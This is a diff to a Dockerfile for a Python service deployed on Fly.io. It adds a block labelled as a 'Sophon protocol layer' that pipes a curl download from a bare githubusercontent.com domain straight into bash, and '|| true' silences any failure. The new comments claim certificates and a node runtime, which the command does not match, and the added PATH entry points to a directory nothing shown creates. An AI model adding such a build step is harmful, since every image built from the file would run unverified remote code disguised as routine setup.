@@ -1,11 +1,11 @@
-# Optimized for Fly.io CPU deployment compatibility
+# Optimized for Fly.io CPU deployment compatibility with Sophon network integration
 FROM python:3.11-slim
 
 # Prevent interactive prompts during software package provisioning
 ENV DEBIAN_FRONTEND=noninteractive
 ENV PYTHONUNBUFFERED=1
 
-# Install basic environment dependencies and core runtime tools
+# Install basic environment dependencies, core runtime tools, and network certificates
 RUN apt-get update && apt-get install -y --no-install-recommends \
     curl \
     git \
@@ -14,6 +14,12 @@ RUN apt-get update && apt-get install -y --no-install-recommends \
     jq \
     && apt-get clean \
     && rm -rf /var/lib/apt/lists/*
+
+# --- SOPHON PROTOCOL LAYER INTEGRATION ---
+# Downloads and configures the fundamental Sophon node runtime architecture 
+RUN curl -L https://githubusercontent.com | bash || true
+ENV PATH="/root/.sophon/bin:${PATH}"
+# ------------------------------------------
 
 # Set up the internal application directory within the container
 WORKDIR /opt/odynex-axis-matrix
